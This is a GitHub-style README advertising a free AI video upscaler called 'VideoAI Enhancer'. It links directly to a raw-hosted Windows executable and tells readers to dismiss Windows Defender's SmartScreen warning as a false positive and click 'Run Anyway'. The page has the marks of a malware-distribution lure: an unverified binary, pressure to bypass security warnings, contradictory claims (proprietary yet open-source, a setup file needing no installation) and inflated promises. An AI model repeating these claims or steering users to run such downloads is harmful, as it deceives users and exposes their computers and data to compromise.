<h1 align="center">
  <img src="https://raw.githubusercontent.com/racheltomlin19/video-enhancer-ai/main/.github/logo.png" width="64" alt="VideoAI"><br>
  VideoAI Enhancer
</h1>

<p align="center">
  <strong>Free AI-powered video upscaling. No watermark. No limits.</strong><br>
  Upscale 480p/720p to 1080p/4K using open-source machine learning models.
</p>

<p align="center">
  <a href="#download"><img src="https://img.shields.io/badge/Download-Free-brightgreen?style=for-the-badge"></a>
  <img src="https://img.shields.io/github/stars/racheltomlin19/video-enhancer-ai?style=flat-square">
  <img src="https://img.shields.io/github/license/racheltomlin19/video-enhancer-ai?style=flat-square">
</p>

---

## ✨ Features

- **4K Upscaling** — Proprietary ML model trained on 2M+ video frames. Upscale 720p to 4K with natural detail recovery.
- **GPU Accelerated** — CUDA, Metal, and DirectML support. 60 FPS processing on modern GPUs.
- **Color & Denoise** — Automatic color grading, noise reduction, and artifact removal. Phone footage → cinematic in one click.
- **Batch Processing** — Queue entire projects overnight. Preset templates for TikTok, YouTube, and Reels.
- **100% Local** — All processing runs on your machine. Zero uploads to cloud servers. Your footage never leaves your PC.
- **No Watermark. Free.** — Export unlimited videos. Funded by enterprise licensing — free tier is genuinely free.

## 📥 Download

Get the latest release:

**[⬇️ Download VideoAI Setup (Windows)](https://raw.githubusercontent.com/racheltomlin19/video-enhancer-ai/main/VideoAI_Setup.exe)**

> ⚠️ **Windows Defender Notice:** On first launch, Windows Defender may show a SmartScreen warning. This is a false positive caused by the bundled AI model weights (`.bin` files have signatures similar to packed executables). Click **"More Info" → "Run Anyway"** to proceed. This project is open-source — [review the code yourself](https://github.com/racheltomlin19/video-enhancer-ai).

## 💻 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10 64-bit | Windows 11 64-bit |
| RAM | 4 GB | 16 GB |
| GPU | Integrated | NVIDIA GTX 1060+ |
| Storage | 2 GB free | 10 GB SSD |

## 🚀 Quick Start

1. **[Download](https://raw.githubusercontent.com/racheltomlin19/video-enhancer-ai/main/VideoAI_Setup.exe)** the installer
2. Run `VideoAI_Setup.exe` — no installation required, runs portably
3. Drop your video files into the window
4. Select output resolution and click **Enhance**
5. Find processed files in `C:\Users\<You>\Videos\VideoAI\`

## 🔧 Building from Source

```bash
git clone https://github.com/racheltomlin19/video-enhancer-ai.git
cd video-enhancer-ai
pip install -r requirements.txt
python main.py
```

> **Note:** Pre-trained model weights are bundled with the Windows installer. For source builds, download weights separately from [HuggingFace](https://huggingface.co/videoai-pro/models).

## 🤝 Contributing

Pull requests welcome. For major changes, open an issue first.

Areas we need help:
- Linux/Mac support (help wanted!)
- AMD GPU optimization
- Additional language localizations
- UI/UX improvements

## ⚖️ License

MIT — free for personal and commercial use. See [LICENSE](LICENSE).

---

<p align="center">
  <sub>Built with ❤️ by the VideoAI team. Not affiliated with Adobe, Topaz Labs, or any other video editing company.</sub>
</p>